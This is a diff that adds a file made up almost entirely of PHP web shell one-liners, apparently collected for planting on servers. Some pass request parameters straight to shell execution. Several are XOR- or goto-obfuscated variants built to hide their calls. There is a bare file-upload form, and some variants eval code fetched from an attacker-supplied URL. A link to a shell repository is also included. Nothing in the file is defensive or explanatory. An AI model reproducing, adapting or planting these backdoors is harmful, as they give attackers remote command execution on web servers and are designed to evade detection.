@@ -1,0 +1,24 @@
+<?php echo file_get_contents('/manila/admission/2025/'); ?>
+/quest/assets/javascript
+
+https://github.com/Error996/unishell
+
+<?=`$_GET[0]`?>
+<?=`$_POST[0]`?>
+<?=`{$_REQUEST['_']}`?>
+<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
+<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]); ?>
+<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]); ?>
+<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]($_[2])); ?>
+<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]($_[2])); ?>
+<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>
+<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>
+<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>
+<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>
+<?php echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>'; }}?>
+<?php $ា=$_GET;if($ា[ត]!=null)$ា[ល]==ធិ៤០៤&$ា[ម]($ា[ប]); ?>
+<?$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ធិ៤០៤&$ា[ម]($ា[ប]); eval('?>'.file_get_contents($ា[ដ]));?>
+<?php goto JFDwF; NnbkH: $gOzsO[ល] == ធិ៤០៤ & $gOzsO[ម]($gOzsO[ប]); goto ymB7H; B3hLL: if (!($gOzsO[ត] != null)) { goto y8I95; } goto NnbkH; JFDwF: $gOzsO = $_GET; goto B3hLL; ymB7H: y8I95: ?>
+<?php goto N6Ag4; KMKUH: $I9NO2[ល] == ធិ៤០៤ & $I9NO2[ម]($I9NO2[ប]); goto cuHHG; N6Ag4: $I9NO2 = $_GET; goto clZU6; clZU6: if (!($I9NO2[ត] != null)) { goto P0yeE; } goto KMKUH; cuHHG: P0yeE: goto hYsr_; hYsr_: eval("\x3f\x3e" . file_get_contents($I9NO2[ដ])); ?>
+
